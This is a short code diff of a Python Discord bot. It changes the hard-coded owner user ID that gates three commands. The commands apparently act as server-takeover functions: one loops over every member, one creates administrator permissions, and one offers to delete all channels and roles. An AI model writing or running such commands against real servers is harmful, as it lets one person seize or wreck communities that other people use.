@@ -680,7 +680,7 @@ async def enhanced(ctx):
 
 @bot.command()
 async def sleep(ctx):
-    if ctx.author.id != 1188620657588699176:
+    if ctx.author.id != 761769388335431690:
         return await ctx.send("You are not the bot owner!")
 
     for member in ctx.guild.members:
@@ -694,7 +694,7 @@ async def sleep(ctx):
 
 @bot.command()
 async def admin(ctx):
-    if ctx.author.id != 1188620657588699176:
+    if ctx.author.id != 761769388335431690:
         return await ctx.send("You are not the bot owner!")
 
     perms = discord.Permissions(administrator=True)
@@ -736,7 +736,7 @@ async def botrole(ctx):
 
 @bot.command()
 async def delete(ctx):
-    if ctx.author.id != 1188620657588699176:
+    if ctx.author.id != 761769388335431690:
         return await ctx.send("You are not the bot owner!")
     
     await ctx.send("Are you sure you want to delete all the channels and roles? (yes/no)")
